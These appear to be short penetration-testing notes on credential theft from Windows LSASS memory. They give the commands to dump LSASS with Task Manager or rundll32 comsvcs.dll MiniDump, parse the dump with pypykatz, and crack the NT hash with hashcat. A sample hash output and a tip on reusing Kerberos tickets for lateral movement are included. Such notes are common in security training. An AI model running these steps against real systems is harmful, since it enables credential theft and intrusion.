- LSASS holds credentials in memory for currently logged-in users, if we dump its memory we can extract those creds (even cleartext sometimes)

---
## Find LSASS's PID
```cmd
tasklist /svc
```
or in PowerShell: `Get-Process lsass`

---
## Dump it (2 ways)
- **GUI**: Task Manager -> right click Local Security Authority Process -> Create dump file (creates `lsass.DMP` in `%temp%`)

- **CLI** (works without GUI, but AV usually flags this as malicious):
```powershell
# Find the LSASS PID first 
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
```

---
## Extract creds from the dump (on our Linux box)
```bash
pypykatz lsa minidump lsass.dmp

# Example Output
== MSV ==  
Username: bob  
NT: 64f12cddaa88057e06a81b54e73b949b  
== WDIGEST ==  
password None
```

- `MSV` section = always has the NT hash for that logon session, crack it the same way as SAM hashes
- `WDIGEST` = if this shows an actual cleartext password instead of `None`, that's a direct win (only happens on old Windows versions where WDIGEST is enabled)
- `Kerberos` section (not shown above) = has tickets, useful for later AD lateral movement

```bash
hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b rockyou.txt
```